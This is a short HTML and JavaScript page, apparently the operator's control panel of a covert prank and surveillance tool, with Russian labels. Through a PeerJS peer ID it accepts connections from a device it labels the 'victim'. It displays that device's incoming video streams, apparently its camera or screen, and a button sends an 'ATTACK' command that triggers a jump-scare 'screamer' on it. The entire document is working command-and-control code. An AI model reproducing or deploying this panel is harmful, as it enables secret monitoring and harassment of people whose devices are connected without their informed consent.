<!DOCTYPE html>
<html>
<head>
    <title>Панель Управления (Ваниш)</title>
    <meta charset="utf-8">
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <style>
        body { background: #0b0b0b; color: #0f0; font-family: monospace; display: flex; margin: 0; height: 100vh; }
        #sidebar { width: 280px; border-right: 1px solid #333; padding: 20px; background: #111; }
        #display { flex: 1; display: grid; grid-template-columns: 1fr 1fr; gap: 10px; padding: 10px; }
        video { width: 100%; border: 2px solid #ff0050; border-radius: 10px; background: #000; }
        .btn-attack { background: #ff0000; color: #fff; border: none; padding: 20px; width: 100%; cursor: pointer; font-weight: bold; font-size: 18px; border-radius: 10px; margin-top: 20px; }
        .user-card { background: #222; padding: 10px; border-radius: 5px; margin-top: 10px; border-left: 3px solid #0f0; }
    </style>
</head>
<body>
    <audio id="notif-sound" src="https://www.myinstants.com/media/sounds/discord-notification.mp3"></audio>

    <div id="sidebar">
        <h2>SYSTEM CONTROL</h2>
        <div id="status">ОЖИДАНИЕ...</div>
        <div id="user-info"></div>
        <hr color="#333">
        <button id="attackBtn" class="btn-attack" onclick="attack()" disabled>⚡ ЗАПУСТИТЬ СКРИМЕР ⚡</button>
    </div>
    <div id="display"></div>

    <script>
        const MY_ID = '09062012';
        const peer = new Peer(MY_ID);
        let activeConn = null;

        // Функция звука
        function playNotif() {
            const audio = document.getElementById('notif-sound');
            audio.play().catch(() => console.log("Кликни по странице для активации звука"));
        }

        peer.on('connection', conn => {
            activeConn = conn;
            playNotif(); // Звук при подключении данных
            document.getElementById('status').innerText = "ЖЕРТВА В СЕТИ";
            document.getElementById('user-info').innerHTML = `<div class="user-card">NEW DEVICE CONNECTED</div>`;
            document.getElementById('attackBtn').disabled = false;
        });

        peer.on('call', call => {
            call.answer();
            call.on('stream', stream => {
                const v = document.createElement('video');
                v.autoplay = true; v.playsinline = true; v.controls = true;
                v.srcObject = stream;
                document.getElementById('display').appendChild(v);
            });
        });

        function attack() {
            if(activeConn) activeConn.send('ATTACK');
        }
    </script>
</body>
</html>
